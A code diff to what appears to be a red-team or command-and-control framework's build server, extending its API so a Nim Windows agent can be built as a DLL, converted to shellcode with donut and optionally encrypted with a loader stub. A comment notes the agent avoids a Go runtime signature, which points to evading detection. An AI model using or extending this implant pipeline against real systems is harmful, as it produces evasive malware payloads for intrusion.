@@ -753,14 +753,28 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 	os.MkdirAll(payloadsDir, 0755)
 	os.MkdirAll(deliveryDir, 0755)
 
-	// Nim agent — Windows EXE, ~560KB, no Go runtime signature
+	// Nim agent — Windows EXE/DLL, ~560KB, no Go runtime signature
 	if cfg.Lang == "nim" {
-		exePath, err := BuildNimEXE(cfg, payloadsDir)
+		nimPath, err := BuildNimEXE(cfg, payloadsDir)
 		if err != nil {
 			jsonErr(w, "nim build: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		result["exe"] = exePath
+		if cfg.Format == "dll" {
+			result["dll"] = nimPath
+			// Convert Nim DLL to shellcode with donut (same pipeline as Go DLL)
+			if rawPath, err := BuildRAW(nimPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			}
+		} else {
+			result["exe"] = nimPath
+		}
 		jsonOK(w, result)
 		return
 	}
